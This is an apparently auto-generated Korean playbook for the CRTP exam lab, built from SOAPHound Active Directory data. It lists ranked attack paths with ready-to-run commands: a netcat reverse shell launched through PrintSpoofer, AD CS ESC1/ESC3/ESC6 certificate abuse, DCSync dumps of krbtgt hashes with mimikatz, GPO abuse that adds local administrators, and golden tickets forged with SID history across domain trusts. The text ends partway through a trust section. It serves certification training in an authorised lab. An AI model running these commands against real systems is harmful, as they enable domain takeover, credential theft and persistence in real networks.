# CRTP 공격 플레이북 (SOAPHound 데이터 기반)

> 이 파일은 **시험 중 공격 조수용**입니다. 명령어는 인가된 랩에서만 실행하세요.

## 시험 목표 요약
- **targets**: 5
- **goal**: 5개 대상 서버 전부에서 OS 명령 실행 권한 획득 (관리자 아니어도 됨)
- **final_flag**: C:\Users\finadmin\Desktop\finalflag.txt (DC)
- **ports**: 인바운드/아웃바운드 TCP 4444, 8888 만 허용
- **domains**: 다중 도메인 (트러스트 경로 매핑 필수)
- **time**: 환경 24h (실습 12h + 보고서 6h 권장)

## 수집 데이터 요약
- 도메인: `DOLLARCORP.MONEYCORP.LOCAL`  SID: `S-1-5-21-719815819-3726368948-3917688648`
- users=98 groups=44 computers=28 domains=1 gpos=6 ous=5

## 우선순위 공격 경로 (priority 낮을수록 먼저)

### [INFO] High-value group: Account Operators  ·  _Enumeration / Objective_  (prio 5)
- **대상**: ACCOUNT OPERATORS@DOLLARCORP.MONEYCORP.LOCAL
- **근거**: Account Operators members: []
- **명령어**:
  - _PowerView_:
    ```
    Get-DomainGroupMember -Identity 'Account Operators' -Recurse
    ```
  - _AD Module_:
    ```
    Get-ADGroupMember -Identity 'Account Operators' -Recursive
    ```
- **확인할 것**:
  - [ ] 최종 목표 계정 식별
  - [ ] 현재 경로가 이 그룹으로 수렴하는지
- **📸 스크린샷 (보고서 필수)**:
  - [ ] Account Operators 멤버십 확인 화면
- **메모**: 공격 경로의 최종 목적지 후보. flag 는 보통 이 권한 획득 후 접근 가능.

### [INFO] High-value group: Administrators  ·  _Enumeration / Objective_  (prio 5)
- **대상**: <unknown>, DOMAIN ADMINS@DOLLARCORP.MONEYCORP.LOCAL, ADMINISTRATOR@DOLLARCORP.MONEYCORP.LOCAL
- **근거**: Administrators members: ['<unknown>', 'DOMAIN ADMINS@DOLLARCORP.MONEYCORP.LOCAL', 'ADMINISTRATOR@DOLLARCORP.MONEYCORP.LOCAL']
- **명령어**:
  - _PowerView_:
    ```
    Get-DomainGroupMember -Identity 'Administrators' -Recurse
    ```
  - _AD Module_:
    ```
    Get-ADGroupMember -Identity 'Administrators' -Recursive
    ```
- **확인할 것**:
  - [ ] 최종 목표 계정 식별
  - [ ] 현재 경로가 이 그룹으로 수렴하는지
- **📸 스크린샷 (보고서 필수)**:
  - [ ] Administrators 멤버십 확인 화면
- **메모**: 공격 경로의 최종 목적지 후보. flag 는 보통 이 권한 획득 후 접근 가능.

### [INFO] High-value group: Backup Operators  ·  _Enumeration / Objective_  (prio 5)
- **대상**: BACKUP OPERATORS@DOLLARCORP.MONEYCORP.LOCAL
- **근거**: Backup Operators members: []
- **명령어**:
  - _PowerView_:
    ```
    Get-DomainGroupMember -Identity 'Backup Operators' -Recurse
    ```
  - _AD Module_:
    ```
    Get-ADGroupMember -Identity 'Backup Operators' -Recursive
    ```
- **확인할 것**:
  - [ ] 최종 목표 계정 식별
  - [ ] 현재 경로가 이 그룹으로 수렴하는지
- **📸 스크린샷 (보고서 필수)**:
  - [ ] Backup Operators 멤버십 확인 화면
- **메모**: 공격 경로의 최종 목적지 후보. flag 는 보통 이 권한 획득 후 접근 가능.

### [INFO] High-value group: DnsAdmins (typical)  ·  _Enumeration / Objective_  (prio 5)
- **대상**: SRVADMIN@DOLLARCORP.MONEYCORP.LOCAL
- **근거**: DnsAdmins (typical) members: ['SRVADMIN@DOLLARCORP.MONEYCORP.LOCAL']
- **명령어**:
  - _PowerView_:
    ```
    Get-DomainGroupMember -Identity 'DnsAdmins' -Recurse
    ```
  - _AD Module_:
    ```
    Get-ADGroupMember -Identity 'DnsAdmins (typical)' -Recursive
    ```
- **확인할 것**:
  - [ ] 최종 목표 계정 식별
  - [ ] 현재 경로가 이 그룹으로 수렴하는지
- **📸 스크린샷 (보고서 필수)**:
  - [ ] DnsAdmins (typical) 멤버십 확인 화면
- **메모**: 공격 경로의 최종 목적지 후보. flag 는 보통 이 권한 획득 후 접근 가능.

### [INFO] High-value group: Domain Admins  ·  _Enumeration / Objective_  (prio 5)
- **대상**: SVCADMIN@DOLLARCORP.MONEYCORP.LOCAL, ADMINISTRATOR@DOLLARCORP.MONEYCORP.LOCAL
- **근거**: Domain Admins members: ['SVCADMIN@DOLLARCORP.MONEYCORP.LOCAL', 'ADMINISTRATOR@DOLLARCORP.MONEYCORP.LOCAL']
- **명령어**:
  - _PowerView_:
    ```
    Get-DomainGroupMember -Identity 'Domain Admins' -Recurse
    ```
  - _AD Module_:
    ```
    Get-ADGroupMember -Identity 'Domain Admins' -Recursive
    ```
- **확인할 것**:
  - [ ] 최종 목표 계정 식별
  - [ ] 현재 경로가 이 그룹으로 수렴하는지
- **📸 스크린샷 (보고서 필수)**:
  - [ ] Domain Admins 멤버십 확인 화면
- **메모**: 공격 경로의 최종 목적지 후보. flag 는 보통 이 권한 획득 후 접근 가능.

### [INFO] High-value group: Domain Controllers  ·  _Enumeration / Objective_  (prio 5)
- **대상**: DOMAIN CONTROLLERS@DOLLARCORP.MONEYCORP.LOCAL
- **근거**: Domain Controllers members: []
- **명령어**:
  - _PowerView_:
    ```
    Get-DomainGroupMember -Identity 'Domain Controllers' -Recurse
    ```
  - _AD Module_:
    ```
    Get-ADGroupMember -Identity 'Domain Controllers' -Recursive
    ```
- **확인할 것**:
  - [ ] 최종 목표 계정 식별
  - [ ] 현재 경로가 이 그룹으로 수렴하는지
- **📸 스크린샷 (보고서 필수)**:
  - [ ] Domain Controllers 멤버십 확인 화면
- **메모**: 공격 경로의 최종 목적지 후보. flag 는 보통 이 권한 획득 후 접근 가능.

### [INFO] High-value group: Group Policy Creator Owners  ·  _Enumeration / Objective_  (prio 5)
- **대상**: ADMINISTRATOR@DOLLARCORP.MONEYCORP.LOCAL
- **근거**: Group Policy Creator Owners members: ['ADMINISTRATOR@DOLLARCORP.MONEYCORP.LOCAL']
- **명령어**:
  - _PowerView_:
    ```
    Get-DomainGroupMember -Identity 'Group Policy Creator Owners' -Recurse
    ```
  - _AD Module_:
    ```
    Get-ADGroupMember -Identity 'Group Policy Creator Owners' -Recursive
    ```
- **확인할 것**:
  - [ ] 최종 목표 계정 식별
  - [ ] 현재 경로가 이 그룹으로 수렴하는지
- **📸 스크린샷 (보고서 필수)**:
  - [ ] Group Policy Creator Owners 멤버십 확인 화면
- **메모**: 공격 경로의 최종 목적지 후보. flag 는 보통 이 권한 획득 후 접근 가능.

### [CRITICAL] SeImpersonate -> SYSTEM (Potato)  ·  _Local Privilege Escalation_  (prio 6)
- **대상**: <current host>
- **근거**: token holds SeImpersonatePrivilege (Enabled)
- **명령어**:
  - _PrintSpoofer_:
    ```
    PrintSpoofer64.exe -i -c cmd
    ```
    ```
    PrintSpoofer64.exe -c "nc <studvm> 4444 -e cmd"
    ```
  - _GodPotato_:
    ```
    GodPotato-NET4.exe -cmd "cmd /c whoami"
    ```
- **확인할 것**:
  - [ ] escalation 후 whoami 가 'nt authority\system' 인지
  - [ ] SYSTEM 쉘에서 mimikatz 로 자격/티켓 덤프 가능한지
- **📸 스크린샷 (보고서 필수)**:
  - [ ] whoami /priv 에 SeImpersonatePrivilege 보이는 화면 (escalation 전)
  - [ ] exploit 실행 + whoami == SYSTEM 화면 (escalation 후)
- **메모**: Service-account token can impersonate SYSTEM via named-pipe/RPC trick. Most common service-account escalation. Use port 4444/8888 for any shell.

### [CRITICAL] AD CS ESC1 — template 'ESC1-User'  ·  _Domain/Cross-Trust Privilege Escalation (AD CS)_  (prio 7)
- **대상**: ESC1-User @ mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
- **근거**: ESC1: template 'ESC1-User' on CA 'mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA'. 악용 가능 주체: dcorp\RDPUsers, mcorp\Domain Users
- **명령어**:
  - _Certify request_:
    ```
    Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:ESC1-User /altname:administrator@moneycorp.local
    ```
  - _pfx 변환_:
    ```
    openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc1.pfx
    ```
  - _Rubeus asktgt_:
    ```
    Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:<pfx_pw> /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
    ```
- **확인할 것**:
  - [ ] 현재 계정이 dcorp\RDPUsers, mcorp\Domain Users 에 속하는지
  - [ ] 인증서 request 성공 여부
  - [ ] 발급 인증서로 특권 사용자 TGT 획득(klist) 및 대상 접근
- **📸 스크린샷 (보고서 필수)**:
  - [ ] Certify find /vulnerable 에 'ESC1-User' ESC1 조건 보이는 화면
  - [ ] ESC1 request 성공 (인증서 발급) 화면
  - [ ] asktgt /ptt 후 klist + 대상 DC 접근 화면
- **메모**: 템플릿이 ENROLLEE_SUPPLIES_SUBJECT + client-auth EKU + 승인0 + 저권한 enroll → 임의 사용자(DA/EA) SAN으로 인증서 발급 후 그 사용자로 인증.

### [CRITICAL] AD CS ESC3 — template 'SmartCardEnrollment-Agent'  ·  _Domain/Cross-Trust Privilege Escalation (AD CS)_  (prio 7)
- **대상**: SmartCardEnrollment-Agent @ mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
- **근거**: ESC3: template 'SmartCardEnrollment-Agent' on CA 'mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA'. 악용 가능 주체: dcorp\Domain Users
- **명령어**:
  - _1) EA 인증서 발급_:
    ```
    Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
    ```
  - _2) on-behalf-of 요청_:
    ```
    Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:<client-auth 템플릿> /onbehalfof:moneycorp\administrator /enrollcert:ea.pfx /enrollcertpw:<pw>
    ```
  - _3) asktgt_:
    ```
    Rubeus.exe asktgt /user:administrator /certificate:onbehalf.pfx /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
    ```
- **확인할 것**:
  - [ ] 현재 계정이 dcorp\Domain Users 에 속하는지
  - [ ] 인증서 request 성공 여부
  - [ ] 발급 인증서로 특권 사용자 TGT 획득(klist) 및 대상 접근
- **📸 스크린샷 (보고서 필수)**:
  - [ ] Certify find /vulnerable 에 'SmartCardEnrollment-Agent' ESC3 조건 보이는 화면
  - [ ] ESC3 request 성공 (인증서 발급) 화면
  - [ ] asktgt /ptt 후 klist + 대상 DC 접근 화면
- **메모**: Enrollment Agent 템플릿(Certificate Request Agent EKU)을 저권한이 enroll 가능 → EA 인증서로 특권 사용자 대신 client-auth 인증서 요청.

### [CRITICAL] DCSync  ·  _Domain Persistence / Credential Access_  (prio 8)
- **대상**: S-1-5-21-335606122-960912869-3279953914-498
- **근거**: S-1-5-21-335606122-960912869-3279953914-498 holds ['GetChanges'] on DOLLARCORP.MONEYCORP.LOCAL
- **명령어**:
  - _mimikatz_:
    ```
    lsadump::dcsync /user:DOLLARCORP.MONEYCORP.LOCAL\krbtgt
    ```
    ```
    lsadump::dcsync /user:DOLLARCORP.MONEYCORP.LOCAL\Administrator
    ```
  - _Rubeus/secretsdump_:
    ```
    # 대안: secretsdump.py -just-dc <dom>/<user>@<dc>
    ```
- **확인할 것**:
  - [ ] 현재 컨텍스트가 S-1-5-21-335606122-960912869-3279953914-498 인지/될 수 있는지
  - [ ] krbtgt 해시 확보 여부 (Golden Ticket 전제)
- **📸 스크린샷 (보고서 필수)**:
  - [ ] S-1-5-21-335606122-960912869-3279953914-498 의 GetChanges/GetChangesAll 권한 확인 (Get-DomainObjectAcl)
  - [ ] dcsync 로 krbtgt 해시 덤프 화면
- **메모**: DCSync 권한 → krbtgt 해시 → Golden Ticket 로 도메인 지속성.

### [CRITICAL] DCSync  ·  _Domain Persistence / Credential Access_  (prio 8)
- **대상**: DOMAIN CONTROLLERS@DOLLARCORP.MONEYCORP.LOCAL
- **근거**: DOMAIN CONTROLLERS@DOLLARCORP.MONEYCORP.LOCAL holds ['GetChangesAll'] on DOLLARCORP.MONEYCORP.LOCAL
- **명령어**:
  - _mimikatz_:
    ```
    lsadump::dcsync /user:DOLLARCORP.MONEYCORP.LOCAL\krbtgt
    ```
    ```
    lsadump::dcsync /user:DOLLARCORP.MONEYCORP.LOCAL\Administrator
    ```
  - _Rubeus/secretsdump_:
    ```
    # 대안: secretsdump.py -just-dc <dom>/<user>@<dc>
    ```
- **확인할 것**:
  - [ ] 현재 컨텍스트가 DOMAIN CONTROLLERS@DOLLARCORP.MONEYCORP.LOCAL 인지/될 수 있는지
  - [ ] krbtgt 해시 확보 여부 (Golden Ticket 전제)
- **📸 스크린샷 (보고서 필수)**:
  - [ ] DOMAIN CONTROLLERS@DOLLARCORP.MONEYCORP.LOCAL 의 GetChanges/GetChangesAll 권한 확인 (Get-DomainObjectAcl)
  - [ ] dcsync 로 krbtgt 해시 덤프 화면
- **메모**: DCSync 권한 → krbtgt 해시 → Golden Ticket 로 도메인 지속성.

### [CRITICAL] AD CS ESC6 — CA allows requester-specified SAN (EDITF_ATTRIBUTESUBJECTALTNAME2)  ·  _Domain/Cross-Trust Privilege Escalation (AD CS)_  (prio 9)
- **대상**: mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
- **근거**: CA 'mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA' has EDITF_ATTRIBUTESUBJECTALTNAME2 set — any enrollable client-auth template can specify an arbitrary SAN
- **명령어**:
  - _Certify (any client-auth template)_:
    ```
    Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:<enrollable_clientauth_tpl> /altname:administrator@moneycorp.local
    ```
  - _asktgt_:
    ```
    Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /password:<pfx_pw> /domain:moneycorp.local /ptt
    ```
- **확인할 것**:
  - [ ] CA 플래그에 EDITF_ATTRIBUTESUBJECTALTNAME2 확인
  - [ ] enroll 가능한 client-auth 템플릿 식별
  - [ ] 발급 인증서로 특권 사용자 인증 성공
- **📸 스크린샷 (보고서 필수)**:
  - [ ] Certify find 에서 'mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA' UserSpecifiedSAN 표시 화면
  - [ ] altname 지정 request 성공 화면
  - [ ] asktgt /ptt + klist 화면
- **메모**: CA 'mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA' 레벨 SAN 악용(ESC6). 2022 패치 후에도 플래그가 켜져 있으면 유효.

### [CRITICAL] ACL abuse: Owns  ·  _Domain Privilege Escalation / Persistence_  (prio 10)
- **대상**: DNSADMINS@DOLLARCORP.MONEYCORP.LOCAL
- **근거**: Local System has Owns over DNSADMINS@DOLLARCORP.MONEYCORP.LOCAL [HIGH-VALUE target]
- **명령어**:
  - _PowerView_:
    ```
    Add-DomainGroupMember -Identity 'DnsAdmins' -Members <you>
    ```
  - _AD Module_:
    ```
    Add-ADGroupMember -Identity 'DnsAdmins' -Members <you>
    ```
- **확인할 것**:
  - [ ] Local System 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)
  - [ ] 권한 행사 후 대상에 대한 실질적 접근 획득 확인
- **📸 스크린샷 (보고서 필수)**:
  - [ ] ACL 확인: Get-DomainObjectAcl -Identity DNSADMINS@DOLLARCORP.MONEYCORP.LOCAL 출력
  - [ ] 권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)
  - [ ] 남용 후 획득한 접근 증명 화면
- **메모**: Local System -(Owns)-> DNSADMINS@DOLLARCORP.MONEYCORP.LOCAL. CRTP 경로에서 자주 나오는 ACL 체인.

### [CRITICAL] GPO abuse: GenericAll over GPO  ·  _Domain Privilege Escalation_  (prio 11)
- **대상**: DCORP-ADMINSRV.DOLLARCORP.MONEYCORP.LOCAL
- **근거**: RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL has GenericAll over GPO 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' -> affects 1 computer(s): DCORP-ADMINSRV.DOLLARCORP.MONEYCORP.LOCAL
- **명령어**:
  - _Enum_:
    ```
    Get-DomainGPO -Identity 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL'
    ```
    ```
    Get-DomainOU -GPLink <gpo_guid> | select name,distinguishedname
    ```
  - _Abuse (SharpGPOAbuse)_:
    ```
    SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName "APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL"
    ```
    ```
    SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author <dom\you> --Command cmd.exe --Arguments "/c net localgroup administrators <you> /add" --GPOName "APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL"
    ```
  - _PowerView_:
    ```
    New-GPOImmediateTask -TaskName x -GPODisplayName 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' -CommandArguments '<cmd>' -Force
    ```
- **확인할 것**:
  - [ ] RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지
  - [ ] GPO 수정 후 영향 컴퓨터의 gpupdate 시점에 실행되는지
  - [ ] 영향 컴퓨터가 5대 타깃에 포함되는지
- **📸 스크린샷 (보고서 필수)**:
  - [ ] GPO 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' ACL 확인 (Get-DomainGPO / Get-DomainObjectAcl)
  - [ ] GPO 수정 / task 추가 화면
  - [ ] 영향 호스트에서 권한 획득 화면
- **메모**: RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL -(GenericAll)-> GPO 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' -> 링크된 OU의 컴퓨터에 코드 실행 (GPO Abuse, LO6).

### [CRITICAL] GPO abuse: GenericWrite over GPO  ·  _Domain Privilege Escalation_  (prio 11)
- **대상**: DCORP-ADMINSRV.DOLLARCORP.MONEYCORP.LOCAL
- **근거**: RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL has GenericWrite over GPO 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' -> affects 1 computer(s): DCORP-ADMINSRV.DOLLARCORP.MONEYCORP.LOCAL
- **명령어**:
  - _Enum_:
    ```
    Get-DomainGPO -Identity 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL'
    ```
    ```
    Get-DomainOU -GPLink <gpo_guid> | select name,distinguishedname
    ```
  - _Abuse (SharpGPOAbuse)_:
    ```
    SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName "APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL"
    ```
    ```
    SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author <dom\you> --Command cmd.exe --Arguments "/c net localgroup administrators <you> /add" --GPOName "APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL"
    ```
  - _PowerView_:
    ```
    New-GPOImmediateTask -TaskName x -GPODisplayName 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' -CommandArguments '<cmd>' -Force
    ```
- **확인할 것**:
  - [ ] RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지
  - [ ] GPO 수정 후 영향 컴퓨터의 gpupdate 시점에 실행되는지
  - [ ] 영향 컴퓨터가 5대 타깃에 포함되는지
- **📸 스크린샷 (보고서 필수)**:
  - [ ] GPO 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' ACL 확인 (Get-DomainGPO / Get-DomainObjectAcl)
  - [ ] GPO 수정 / task 추가 화면
  - [ ] 영향 호스트에서 권한 획득 화면
- **메모**: RDPUSERS@DOLLARCORP.MONEYCORP.LOCAL -(GenericWrite)-> GPO 'APPLOCKER@DOLLARCORP.MONEYCORP.LOCAL' -> 링크된 OU의 컴퓨터에 코드 실행 (GPO Abuse, LO6).

### [CRITICAL] GPO abuse: GenericWrite over GPO  ·  _Domain Privilege Escalation_  (prio 11)
- **대상**: DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL
- **근거**: DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL has GenericWrite over GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -> affects 1 computer(s): DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL
- **명령어**:
  - _Enum_:
    ```
    Get-DomainGPO -Identity 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL'
    ```
    ```
    Get-DomainOU -GPLink <gpo_guid> | select name,distinguishedname
    ```
  - _Abuse (SharpGPOAbuse)_:
    ```
    SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName "DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL"
    ```
    ```
    SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author <dom\you> --Command cmd.exe --Arguments "/c net localgroup administrators <you> /add" --GPOName "DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL"
    ```
  - _PowerView_:
    ```
    New-GPOImmediateTask -TaskName x -GPODisplayName 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -CommandArguments '<cmd>' -Force
    ```
- **확인할 것**:
  - [ ] DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지
  - [ ] GPO 수정 후 영향 컴퓨터의 gpupdate 시점에 실행되는지
  - [ ] 영향 컴퓨터가 5대 타깃에 포함되는지
- **📸 스크린샷 (보고서 필수)**:
  - [ ] GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' ACL 확인 (Get-DomainGPO / Get-DomainObjectAcl)
  - [ ] GPO 수정 / task 추가 화면
  - [ ] 영향 호스트에서 권한 획득 화면
- **메모**: DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL -(GenericWrite)-> GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -> 링크된 OU의 컴퓨터에 코드 실행 (GPO Abuse, LO6).

### [CRITICAL] GPO abuse: WriteDacl over GPO  ·  _Domain Privilege Escalation_  (prio 11)
- **대상**: DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL
- **근거**: DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL has WriteDacl over GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -> affects 1 computer(s): DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL
- **명령어**:
  - _Enum_:
    ```
    Get-DomainGPO -Identity 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL'
    ```
    ```
    Get-DomainOU -GPLink <gpo_guid> | select name,distinguishedname
    ```
  - _Abuse (SharpGPOAbuse)_:
    ```
    SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName "DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL"
    ```
    ```
    SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author <dom\you> --Command cmd.exe --Arguments "/c net localgroup administrators <you> /add" --GPOName "DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL"
    ```
  - _PowerView_:
    ```
    New-GPOImmediateTask -TaskName x -GPODisplayName 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -CommandArguments '<cmd>' -Force
    ```
- **확인할 것**:
  - [ ] DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지
  - [ ] GPO 수정 후 영향 컴퓨터의 gpupdate 시점에 실행되는지
  - [ ] 영향 컴퓨터가 5대 타깃에 포함되는지
- **📸 스크린샷 (보고서 필수)**:
  - [ ] GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' ACL 확인 (Get-DomainGPO / Get-DomainObjectAcl)
  - [ ] GPO 수정 / task 추가 화면
  - [ ] 영향 호스트에서 권한 획득 화면
- **메모**: DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL -(WriteDacl)-> GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -> 링크된 OU의 컴퓨터에 코드 실행 (GPO Abuse, LO6).

### [CRITICAL] GPO abuse: WriteOwner over GPO  ·  _Domain Privilege Escalation_  (prio 11)
- **대상**: DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL
- **근거**: DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL has WriteOwner over GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -> affects 1 computer(s): DCORP-CI.DOLLARCORP.MONEYCORP.LOCAL
- **명령어**:
  - _Enum_:
    ```
    Get-DomainGPO -Identity 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL'
    ```
    ```
    Get-DomainOU -GPLink <gpo_guid> | select name,distinguishedname
    ```
  - _Abuse (SharpGPOAbuse)_:
    ```
    SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName "DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL"
    ```
    ```
    SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author <dom\you> --Command cmd.exe --Arguments "/c net localgroup administrators <you> /add" --GPOName "DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL"
    ```
  - _PowerView_:
    ```
    New-GPOImmediateTask -TaskName x -GPODisplayName 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -CommandArguments '<cmd>' -Force
    ```
- **확인할 것**:
  - [ ] DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL 를 실제로 제어 가능한지
  - [ ] GPO 수정 후 영향 컴퓨터의 gpupdate 시점에 실행되는지
  - [ ] 영향 컴퓨터가 5대 타깃에 포함되는지
- **📸 스크린샷 (보고서 필수)**:
  - [ ] GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' ACL 확인 (Get-DomainGPO / Get-DomainObjectAcl)
  - [ ] GPO 수정 / task 추가 화면
  - [ ] 영향 호스트에서 권한 획득 화면
- **메모**: DEVOPSADMIN@DOLLARCORP.MONEYCORP.LOCAL -(WriteOwner)-> GPO 'DEVOPS POLICY@DOLLARCORP.MONEYCORP.LOCAL' -> 링크된 OU의 컴퓨터에 코드 실행 (GPO Abuse, LO6).

### [HIGH] Domain/Forest trust abuse  ·  _Cross Trust Attacks_  (prio 12)
- **대상**: EUROCORP.LOCAL
- **근거**: DOLLARCORP.MONEYCORP.LOCAL <-> EUROCORP.LOCAL dir=3 type=4 transitive=True SIDfilter=ON targetSID=S-1-5-21-3333069040-3914854601-3606488808
- **명령어**:
  - _Enum_:
    ```
    Get-DomainTrust
    ```
    ```
    Get-DomainTrustMapping
    ```
    ```
    Get-ADTrust -Filter *
    ```
  - _SID history (⚠ SID filtering ON — 차단 가능성)_:
    ```
    # 이 트러스트는 SID filtering 켜짐 → SID history 주입이 필터될 수 있음
    ```
    ```
    # <child_krbtgt_hash> 는 DCSync 로 확보
    ```
    ```
    mimikatz: kerberos::golden /user:Administrator /domain:DOLLARCORP.MONEYCORP.LOCAL /sid:S-1-5-21-719815819-3726368948-3917688648 /krbtgt:<child_krbtgt_hash> /sids:S-1-5-21-3333069040-3914854601-3606488808-519 /ptt
    ```
  - _대상 도메인 추가 열거_:
    ```
    Get-DomainTrust -Domain EUROCORP.LOCAL
    ```
- **확인할 것**:
  - [ ] 신뢰 방향/타입(부모-자식 vs 포레스트)
  - [ ] SID filtering = ON (OFF여야 SID history 통함)
  - [ ] child krbtgt 해시 확보 여부
- **📸 스크린샷 (보고서 필수)**:
  - [ ] Get-DomainTrustMapping 출력
  - [ ] 위조 티켓으로 대상 도메인 리소스 접근 화면
- **메모**: 대상 EUROCORP.LOCAL (SID S-1-5-21-3333069040-3914854601-3606488808). SID filtering=ON. OFF면 child krbtgt + 대상 EA SID(-519)로 inter-realm TGT 위조.

### [HIGH] Domain/Forest trust abuse  ·  _Cross Trust Attacks_  (prio 12)
- **대상**: MONEYCORP.LOCAL
- **근거**: DOLLARCORP.MONEYCORP.LOCAL <-> MONEYCORP.LOCAL dir=3 type=0 transitive=True SIDfilter=OFF targetSID=S-1-5-21-335606122-960912869-3279953914
- **명령어**:
  - _Enum_:
    ```
    Get-DomainTrust
    ```
    ```
    Get-DomainTrustMapping
    ```
    ```
    Get-ADTrust -Filter *
    ```
  - _SID history (SID filtering OFF — 사용 가능)_:
    ```
    # <child_krbtgt_hash> 는 DCSync 로 확보 (그 외 값은 데이터서 채움)
    ```
    ```
    mimikatz: kerberos::golden /user:Administrator /domain:DOLLARCORP.MONEYCORP.LOCAL /sid:S-1-5-21-719815819-3726368948-3917688648 /krbtgt:<child_krbtgt_hash> /sids:S-1-5-21-335606122-960912869-3279953914-519 /ptt
    ```
  - _대상 도메인 추가 열거_:
    ```
    Get-DomainTrust -Domain MONEYCORP.LOCAL
    ```
- **확인할 것**:
  - [ ] 신뢰 방향/타입(부모-자식 vs 포레스트)
  - [ ] SID filtering = OFF (OFF여야 SID history 통함)
  - [ ] child krbtgt 해시 확보 여부
- **📸 스크린샷 (보고서 필수)**:
  - [ ] Get-DomainTrustMapping 출력
  - [ ] 위조 티켓으로 대상 도메인 리소스 접근 화면
- **메모**: 대상 MONEYCORP.LOCAL (SID S-1-5-21-335606122-960912869-3279953914). SID filtering=OFF. OFF면 child krbtgt + 대상 EA SID(-519)로 inter-realm TGT 위조.

### [HIGH] Domain/Forest trust abuse  ·  _Cross Trust Attacks_  (prio 12)
- **대상**: US.DOLLARCORP.MONEYCORP.LOCAL
- **근거**: DOLLARCORP.MONEYCORP.LOCAL <-> US.DOLLARCORP.MONEYCORP.LOCAL dir=3 type=0 transitive=True SIDfilter=OFF targetSID=S-1-5-21-1028785420-4100948154-1806204659
- **명령어**:
  - _Enum_:
    ```
    Get-DomainTrust
    ```
    ```
    Get-DomainTrustMapping
    ```
    ```
    Get-ADTrust -Filter *
    ```
